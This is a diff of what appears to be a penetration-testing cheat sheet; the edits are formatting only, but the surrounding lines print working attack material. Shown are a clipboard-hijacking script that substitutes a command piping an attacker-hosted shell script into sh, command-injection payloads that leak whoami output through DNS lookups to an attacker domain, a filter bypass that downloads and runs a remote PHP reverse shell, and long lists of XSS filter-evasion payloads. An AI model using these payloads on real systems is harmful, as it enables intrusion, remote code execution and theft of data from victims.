@@ -57,6 +57,7 @@ dict.txt ?a?a?a?a
 document.getElementById('copy').addEventListener('copy', function(e) { e.clipboardData.setData('text/plain', 'curl http://attacker-domain:8000/shell.sh | sh\n'); e.preventDefault(); });
  </script>
  ```
+
 # Execute Fileless Scripts in Golang
 
 ```golang
@@ -150,20 +151,26 @@ ls %0A id
 ```
 
 Time Delay Commands
+
 ```bash
 & ping -c 10 127.0.0.1 &
 ```
 
 Redirecting Output
+
 ```bash
 & whoami > /var/www/images/output.txt &
 ```
+
 OOB (Out Of Band) Exploitation
+
 ```bash
 & nslookup attacker-server.com &
 & nslookup `whoami`.attacker-server.com &
 ```
+
 WAF Bypasses
+
 ```bash
 vuln=127.0.0.1 %0a wget https://evil.txt/reverse.txt -O 
 /tmp/reverse.php %0a php /tmp/reverse.php
@@ -173,7 +180,7 @@ vuln=echo PAYLOAD > /tmp/payload.txt; cat /tmp/payload.txt | base64 -d > /tmp/pa
 
 XSS Cheat Sheet:
 
-https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
+<https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html>
 
 SSRF Bypasses:
 
@@ -268,48 +275,48 @@ This program reads in a file of IP addresses, outputting the server fingerprint 
 package main
 
 import (
-	"bufio"
-	"fmt"
-	"net/http"
-	"os"
+ "bufio"
+ "fmt"
+ "net/http"
+ "os"
 )
 
 func readfile(filePath string) []string {
-	// Read file
-	readFile, err := os.Open(filePath)
-	if err != nil {
-		fmt.Println(err)
-	}
-	// Split lines and append to array
-	fileScanner := bufio.NewScanner(readFile)
-	fileScanner.Split(bufio.ScanLines)
-	var fileLines []string
-	for fileScanner.Scan() {
-		fileLines = append(fileLines, fileScanner.Text())
-	}
-	readFile.Close()
-	return fileLines
+ // Read file
+ readFile, err := os.Open(filePath)
+ if err != nil {
+  fmt.Println(err)
+ }
+ // Split lines and append to array
+ fileScanner := bufio.NewScanner(readFile)
+ fileScanner.Split(bufio.ScanLines)
+ var fileLines []string
+ for fileScanner.Scan() {
+  fileLines = append(fileLines, fileScanner.Text())
+ }
+ readFile.Close()
+ return fileLines
 }
 func scanIPs(ips []string) {
-	// Connect to device ports
-	for i := range ips {
-		target := "http://" + ips[i]
-		response, err := http.Get(target)
-		if err != nil {
-			continue
-		}
-		fmt.Println(ips[i], response.Header.Get("Server"))
-	}
+ // Connect to device ports
+ for i := range ips {
+  target := "http://" + ips[i]
+  response, err := http.Get(target)
+  if err != nil {
+   continue
+  }
+  fmt.Println(ips[i], response.Header.Get("Server"))
+ }
 }
 
 func main() {
-	// Command line argument to parse
-	filePath := os.Args[1]
-	ips := readfile(filePath)
-	// Goroutines
-	go scanIPs(ips)
-	var input string
-	fmt.Scanln(&input)
+ // Command line argument to parse
+ filePath := os.Args[1]
+ ips := readfile(filePath)
+ // Goroutines
+ go scanIPs(ips)
+ var input string
+ fmt.Scanln(&input)
 }
 ```
 
@@ -937,7 +944,7 @@ alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
 <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
 <IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
 <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
-<IMG SRC="jav	ascript:alert('XSS');">
+<IMG SRC="jav ascript:alert('XSS');">
 <IMG SRC="jav&#x09;ascript:alert('XSS');">
 <IMG SRC="jav&#x0A;ascript:alert('XSS');">
 <IMG SRC="jav&#x0D;ascript:alert('XSS');">
@@ -1011,7 +1018,7 @@ Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
 <A HREF="http://1113982867/">XSS</A>
 <A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
 <A HREF="http://0102.0146.0007.00000223/">XSS</A>
-<A HREF="htt	p://6	6.000146.0x7.147/">XSS</A>
+<A HREF="htt p://6 6.000146.0x7.147/">XSS</A>
 <iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
 <svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
 <input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
@@ -1560,7 +1567,7 @@ foo\’; alert(document.cookie);//’;
 <IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&
 #0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
 <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
-<IMG SRC="jav	ascript:alert('XSS');">
+<IMG SRC="jav ascript:alert('XSS');">
 <IMG SRC="jav&#x09;ascript:alert('XSS');">
 <IMG SRC="jav&#x0A;ascript:alert('XSS');">
 <IMG SRC="jav&#x0D;ascript:alert('XSS');">
